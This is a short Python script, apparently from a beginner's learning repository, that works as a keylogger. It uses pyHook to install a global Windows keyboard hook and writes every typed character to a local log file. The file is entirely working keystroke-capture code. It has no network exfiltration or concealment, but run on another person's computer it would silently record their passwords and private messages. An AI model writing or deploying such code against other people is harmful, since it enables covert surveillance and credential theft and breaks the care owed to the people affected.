import pyHook, pythoncom, sys, logging

file_log_windows = 'C:\\Users\\Nick Behrens\\mygitrepo\\PythonStart\\KeyLogger\\logger.txt'
file_log_linux = '~/Documents/Github/PythonStart/KeyLogger/logger.txt'

def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log_windows, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
